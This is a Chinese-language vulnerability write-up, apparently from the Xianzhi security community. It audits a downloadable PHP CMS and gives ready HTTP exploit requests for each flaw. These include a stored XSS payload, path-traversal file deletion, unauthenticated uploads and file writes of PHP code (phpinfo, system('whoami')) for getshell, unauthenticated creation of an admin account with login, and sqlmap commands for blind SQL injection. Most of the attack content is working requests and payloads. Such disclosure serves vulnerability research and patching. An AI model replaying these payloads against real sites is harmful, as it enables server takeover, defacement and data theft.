<meta name="referrer" content="no-referrer"/>
> 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [xz.aliyun.com](https://xz.aliyun.com/t/10557)

> 先知社区，先知安全技术社区

0x00 前言
-------

这套系统漏洞百出, 只能说开发祭天, 法力无边.  
源码 Download: [https://pan.baidu.com/s/1DOFYZKdTAlpPiZ-MwEVXFw](https://pan.baidu.com/s/1DOFYZKdTAlpPiZ-MwEVXFw)  
使用工具: Seay 源代码审计系统, Nodepad++,Phpstudy

0x01 存储型 XSS
------------

定位到一处存储 Xss:  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119191348-c49e9920-4929-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119191348-c49e9920-4929-1.png)  
**/cms/common/php/ajax.php**  
构造 Payload：

```
POST /cms/common/php/ajax.php?run=liuyan HTTP/1.1
Host: x.x.x.x
Connection: keep-alive
Content-Length: 105
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://x.x.x.x
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://x.x.x.x/cms/common/php/ajax.php?run=liuyan
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

diaoyongbiaoqian=hacker&neirong=<script>alert("what the hack")</script>&leixing=1.1.1.1
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119191739-4e37d7aa-492a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119191739-4e37d7aa-492a-1.png)  
后台查看：  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193148-48b342ae-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193148-48b342ae-492c-1.png)

0x02 前台任意文件删除
-------------

定位到一处文件删除操作.  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192010-a82a72a4-492a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192010-a82a72a4-492a-1.png)  
并且没有鉴权操作:  
[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192027-b258357c-492a-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192027-b258357c-492a-1.png)  
很简单的构造 不多说什么....... 可以配合重装漏洞 Getshell  
构造 Payload :

```
POST /cms/cms/include/up.php?run=del HTTP/1.1

url=../../../ddd.jpg
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192301-0e6fc1b8-492b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192301-0e6fc1b8-492b-1.png)

0x03 前台任意文件上传
-------------

### 上传点 1

定位到一处文件上传.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192353-2d67a39c-492b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192353-2d67a39c-492b-1.png)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192438-47fd1764-492b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192438-47fd1764-492b-1.png)

Payload:

```
POST /cms/cms/include/up.php?run=file&path=../../../&filename=1 HTTP/1.1
Host: xxx
Connection: keep-alive
Content-Length: 211
Pragma: no-cache
Cache-Control: no-cache
Accept: application/json, text/javascript, */*; q=0.01
X-Requested-With: XMLHttpRequest
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryU9A5BBZeovUxg3UP
Origin: http://xxx
Referer: http://xxx/cms/cms/admin/wenjian.php?path=../../..
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryU9A5BBZeovUxg3UP
Content-Disposition: form-data; 
Content-Type: application/octet-stream

<?php phpinfo();?>
------WebKitFormBoundaryU9A5BBZe
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192813-c84bf6a6-492b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192813-c84bf6a6-492b-1.png)

### 上传点 2

**/cms/cms/zbzedit/php/zbz.php**  
定义了一堆参数 并且没有进行鉴权操作 直接可导致任意文件上传 Getshell

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119192851-df407332-492b-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119192851-df407332-492b-1.png)  
Payload:

```
POST /cms/cms/zbzedit/php/zbz.php?run=uptxt&path=../../../&path_res=../../&data_pic_name=1 HTTP/1.1
Host: x.x.x.x
Connection: keep-alive
Content-Length: 234
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://x.x.x.x
Content-Type: application/x-www-form-urlencoded
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://x.x.x.x/cms/cms/zbzedit/php/zbz.php?run=uptxt&path=../../../&path_res=../../&data_pic_name=0
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundaryol3qy7YKEOE2tHFq
Content-Disposition: form-data; 
Content-Type: text/plain

<?php system("whoami");?>
------WebKitFormBoundaryol3qy7YKEOE2tHFq--
```

上传即会给出路径，其中参数 **data_pic_name=0** 改名 **data_pic_name=1** 文件原名

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193215-58c1c8b4-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193215-58c1c8b4-492c-1.png)

### 上传点 3

**/cms/cms/admin/ajax.php** 一样的未授权文件上传 (不过这里不能控制改名.)

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193354-93d3e522-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193354-93d3e522-492c-1.png)  
Payload:

```
POST /cms/cms/admin/ajax.php?run=youad_pic HTTP/1.1
Host: x.x.x.x
Connection: keep-alive
Content-Length: 196
Pragma: no-cache
Cache-Control: no-cache
Upgrade-Insecure-Requests: 1
Origin: http://x.x.x.x
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryMnkzsdthG7uKREBW
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/95.0.4638.69 Safari/537.36
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
Referer: http://x.x.x.x/cms/cms/admin/ajax.php?run=youad_pic
Accept-Encoding: gzip, deflate
Accept-Language: zh-CN,zh;q=0.9

------WebKitFormBoundary0saNPreA1a0CHrrt
Content-Disposition: form-data; 
Content-Type: text/plain

<?php phpinfo();?>
------WebKitFormBoundary0saNPreA1a0CHrrt--
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193418-a205d2e0-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193418-a205d2e0-492c-1.png)

0x04 前台未授权 RCE
--------------

**/cms/cms/admin/run_ajax.php** 第 461-470 行 文件编辑保存操作

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193505-be2d031c-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193505-be2d031c-492c-1.png)  
传入 Path neirong 参数即可构成任意文件读写 / 创建操作  
Payload (写到根目录 / ddd.php):

```
POST /cms/cms/admin/run_ajax.php?run=wenjian_edit HTTP/1.1

path=../../../ddd.php&neirong=<?php phpinfo();?>
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193528-cb8e8a9e-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193528-cb8e8a9e-492c-1.png)

0x05 前台未授权添加管理员
---------------

这里看到一处操作 (管理员添加编辑):

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193606-e281f678-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193606-e281f678-492c-1.png)  
Payload :

```
POST /cms/cms/admin/run_ajax.php?run=admin HTTP/1.1

mima=123456&guanliyuan=hack
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193627-ee88baf6-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193627-ee88baf6-492c-1.png)

然后是登录不上后台的 (等级不够), 这里再通过 Login 函数创造 **Sessions**.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193644-f928f2dc-492c-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193644-f928f2dc-492c-1.png)

```
POST /cms/cms/admin/run_ajax.php?run=login HTTP/1.1

guanliyuan=hack&pwd=123456
```

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193658-01748abe-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193658-01748abe-492d-1.png)

刷新即可登录后台.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193709-079592e4-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193709-079592e4-492d-1.png)

0x06 前台 Mysql 盲注
----------------

### 注入点 1

对代码进行复审，即手工二次审计，发现 **/cms/common/php/ajax.php** 存在 SQL 注入.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193817-30710fa4-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193817-30710fa4-492d-1.png)  
传入 id 参数即可构成查询 注入.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193836-3b789c1e-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193836-3b789c1e-492d-1.png)

一把梭 **sqlmap -u "[http://xxx/cms/common/php/ajax.php?run=ad&id=3](http://xxx/cms/common/php/ajax.php?run=ad&id=3)" -p id**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193858-48a10d4a-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193858-48a10d4a-492d-1.png)

### 注入点 2

发现 **/cms/cms/include/make.php** 存在布尔盲注, 时间盲注.

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193932-5d347c6a-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193932-5d347c6a-492d-1.png)

一把梭 + **sqlmap -u "[http://xxx/cms/cms/include/make.php?t=1&php=2&art=2](http://xxx/cms/cms/include/make.php?t=1&php=2&art=2)" -p art**

[![](https://xzfile.aliyuncs.com/media/upload/picture/20211119193938-60525520-492d-1.png)](https://xzfile.aliyuncs.com/media/upload/picture/20211119193938-60525520-492d-1.png)